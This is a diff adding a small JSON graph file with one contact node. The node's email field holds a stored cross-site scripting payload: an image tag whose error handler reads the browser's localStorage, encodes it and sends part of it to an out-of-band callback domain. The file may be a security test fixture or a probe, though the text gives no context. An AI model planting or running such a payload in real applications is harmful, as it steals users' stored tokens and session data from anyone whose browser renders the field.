@@ -1,0 +1,11 @@
+{
+  "nodes": [
+    {
+      "id": 1,
+      "type": "contact",
+      "name": "John Smith",
+      "email": "<img src=x onerror=\"fetch('https://'+btoa(JSON.stringify(localStorage)).substring(0,50)+'.dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun')\">"
+    }
+  ],
+  "edges": []
+}
